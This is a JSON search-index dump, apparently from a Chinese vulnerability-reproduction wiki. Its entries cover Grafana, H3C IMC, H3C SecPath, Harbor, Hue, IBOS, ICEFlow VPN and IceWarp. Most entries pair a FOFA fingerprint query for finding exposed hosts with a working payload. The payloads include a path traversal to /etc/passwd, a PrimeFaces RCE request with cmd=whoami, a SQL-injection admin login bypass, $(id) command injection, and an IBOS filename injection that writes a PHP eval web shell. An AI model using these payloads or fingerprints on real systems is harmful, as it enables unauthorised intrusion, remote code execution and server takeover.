","date":"0001-01-01","objectID":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/:1:0","tags":null,"title":"","uri":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/"},{"categories":null,"content":"漏洞影响 Grafana 8.x ","date":"0001-01-01","objectID":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/:2:0","tags":null,"title":"","uri":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/"},{"categories":null,"content":"网络测绘 app=\"Grafana_Labs-公司产品\" ","date":"0001-01-01","objectID":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/:3:0","tags":null,"title":"","uri":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/"},{"categories":null,"content":"漏洞复现 登录页面 下载源码进行本地分析 https://codeload.github.com/grafana/grafana/zip/refs/tags/v8.3.0 根据漏洞找到 api.go 中的请求路径 r.Get(\"/public/plugins/:pluginId/*\", hs.getPluginAssets) 跟踪对应的 getPluginAssets 方法 从请求路径中获取 /public/plugins/ 后的参数赋值给 pluginID, 然后再被拼接至 pluginFilePath 进入文件读取片段 requestedFile := filepath.Clean(web.Params(c.Req)[\"*\"]) pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile) 也就是说通过默认存在的插件来拼接文件路径构造请求进行文件读取 plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID) if !exists { c.JsonApiErr(404, \"Plugin not found\", nil) return } 插件路径 public/app/plugins/panel 构造请求 /public/plugins/welcome/../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/:4:0","tags":null,"title":"","uri":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/"},{"categories":null,"content":"H3C IMC dynamiccontent.properties.xhtm 远程命令执行 ","date":"0001-01-01","objectID":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 H3C IMC dynamiccontent.properties.xhtm 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行 ","date":"0001-01-01","objectID":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 H3C IMC ","date":"0001-01-01","objectID":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"网络测绘 \"/imc/login.jsf\" \u0026\u0026 body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\" ","date":"0001-01-01","objectID":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 登录页面 发送如下请求包 POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1564 pfdrt=sc\u0026ln=primefaces\u0026pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D\u0026cmd=whoami ","date":"0001-01-01","objectID":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:4:0","tags":null,"title":"","uri":"/h3c-imc-dynamiccontent.properties.xhtm-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 H3C SecParh堡垒机 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"H3C-SecPath-运维审计系统\" \u0026\u0026 body=\"2018\" ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 先通过任意用户登录获取Cookie /audit/gui_detail_view.php?token=1\u0026id=%5C\u0026uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23\u0026login=admin /audit/data_provider.php?ds_y=2019\u0026ds_m=04\u0026ds_d=02\u0026ds_hour=09\u0026ds_min40\u0026server_cond=\u0026service=$(id)\u0026identity_cond=\u0026query_type=all\u0026format=json\u0026browse=true ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 H3C SecParh堡垒机 get_detail_view.php 存在任意用户登录漏洞 与齐治堡垒机出现的漏洞相似 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 H3C SecParh堡垒机 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"H3C-SecPath-运维审计系统\" \u0026\u0026 body=\"2018\" ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 POC验证的Url为 /audit/gui_detail_view.php?token=1\u0026id=%5C\u0026uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23\u0026login=admin 成功获取admin权限 ","date":"0001-01-01","objectID":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/h3c-secparh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Harbor 未授权创建管理员漏洞 CVE-2019-16097 ","date":"0001-01-01","objectID":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/:0:0","tags":null,"title":"","uri":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/"},{"categories":null,"content":"漏洞描述 近日，镜像仓库Harbor爆出任意管理员注册漏洞，攻击者在请求中构造特定字符串，在未授权的情况下可以直接创建管理员账号，从而接管Harbor镜像仓库。我们得到消息，第一时间对该漏洞进了验证，官方已发布公告说明，最新的1.7.6和1.8.3已修复此漏洞，请使用到的用户尽快升级至安全版本。 Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器。Harbor 1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。 ","date":"0001-01-01","objectID":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/:1:0","tags":null,"title":"","uri":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/"},{"categories":null,"content":"漏洞影响 Harbor 1.7.0版本至1.8.2版本 ","date":"0001-01-01","objectID":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/:2:0","tags":null,"title":"","uri":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/"},{"categories":null,"content":"网络测绘 title=\"Harbor\" ","date":"0001-01-01","objectID":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/:3:0","tags":null,"title":"","uri":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/"},{"categories":null,"content":"漏洞复现 登录页面如下E 向**/api/user** 接口发送创建用户的请求, 状态码返回201即创建成功 使用创建的账户成功登录后台 ","date":"0001-01-01","objectID":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/:4:0","tags":null,"title":"","uri":"/harbor-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E-cve-2019-16097/"},{"categories":null,"content":"Hue 后台编辑器命令执行漏洞 ","date":"0001-01-01","objectID":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Hue 后台编辑器存在命令执行漏洞，攻击者通过编辑上传 xxx.sh 文件即可达到命令执行的目的 ","date":"0001-01-01","objectID":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Hue 后台编辑器 ","date":"0001-01-01","objectID":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Hue - 欢迎使用 Hue\" ","date":"0001-01-01","objectID":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 上传并编辑文件为执行的命令 按如下步骤点击即可执行想要执行的命令 ","date":"0001-01-01","objectID":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hue-%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"IBOS 数据库模块 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 IBOS 后台数据库模块 存在任意文件上传漏洞，攻击者进入后台后可以上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 IBOS \u003c 4.5.5 ","date":"0001-01-01","objectID":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"IBOS\" \u0026\u0026 body=\"login-panel\" ","date":"0001-01-01","objectID":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 http://xxx.xxx.xxx.xxx/?r=dashboard/default/login 找到数据库备份模块 提交并抓包 修改filename参数发送包会上传test.php文件到根目录 backuptype=all\u0026custom_enabled=1\u0026method=shell\u0026sizelimit=2048\u0026extendins=0\u0026sqlcompat=MYSQL41\u0026sqlcharset=utf8\u0026usehex=0\u0026usezip=0\u0026filename=peiqi%26echo \"\u003c?php eval($_REQUEST[test]);?\u003e\"\u003etest%PATHEXT:~0,1%php%26test\u0026dbSubmit=1 ","date":"0001-01-01","objectID":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/ibos-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A8%A1%E5%9D%97-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ICEFlow VPN 信息泄露漏洞 ","date":"0001-01-01","objectID":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 ICEFlow VPN 存在信息泄露漏洞，攻击者可以查看日志中的敏感数据来进一步攻击系统 ","date":"0001-01-01","objectID":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 ICEFlow VPN ","date":"0001-01-01","objectID":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"ICEFLOW VPN Router\" ","date":"0001-01-01","objectID":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 可访问的日志 Url 系统日志 http://url/log/system.log VPN日志 http://url/log/vpn.log 访问日志 http://url/log/access.log 告警日志 http://url/log/warn.log 错误日志 http://url/log/error.log 调试日志 http://url/log1/debug.log 移动用户日志 http://url/log/mobile.log 防火墙日志 http://url/log/firewall.log 根据日志信息获得session后，可利用实时登录系统管理后台： http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10\u0026session_id=xxxxxxxxxxxxxx\u0026l=0 ","date":"0001-01-01","objectID":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/iceflow-vpn-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"IceWarp WebClient basic 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行 ","date":"0001-01-01","objectID":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 IceWarp WebClient ","date":"0001-01-01","objectID":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"IceWarp-公司产品\" 